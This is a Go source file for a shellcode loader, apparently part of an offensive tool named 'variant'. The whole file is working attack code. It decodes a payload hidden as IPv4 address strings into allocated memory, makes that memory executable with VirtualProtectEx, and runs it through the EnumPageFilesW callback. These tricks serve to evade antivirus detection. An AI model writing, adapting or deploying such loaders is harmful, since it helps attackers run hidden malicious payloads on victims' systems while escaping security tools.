package loader

import (
	"unsafe"
	"variant/log"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func Ipv4AddressA(shellcode []string) {
	addr, _, err := wdll.AllocADsMem().Call(uintptr(len(shellcode) * 4))
	if addr == 0 || err.Error() != "The operation completed successfully." {
		log.Fatalf("AllocADsMem() err: %v", err)
	}

	addrPtr := addr
	for _, ipv4 := range shellcode {
		u := append([]byte(ipv4), 0)

		_, _, err = wdll.RtlIpv4StringToAddressA().Call(uintptr(unsafe.Pointer(&u[0])), uintptr(0), uintptr(unsafe.Pointer(&u[0])), addrPtr)
		if err != nil && err.Error() != "The operation completed successfully." {
			log.Fatalf("RtlIpv4StringToAddressA() err: %v", err)
		}

		addrPtr += 4
	}

	oldProtect := windows.PAGE_READWRITE
	wdll.VirtualProtectEx().Call(
		uintptr(windows.CurrentProcess()),
		addr, uintptr(len(shellcode)*4),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))

	wdll.EnumPageFilesW().Call(addr, 0)
}
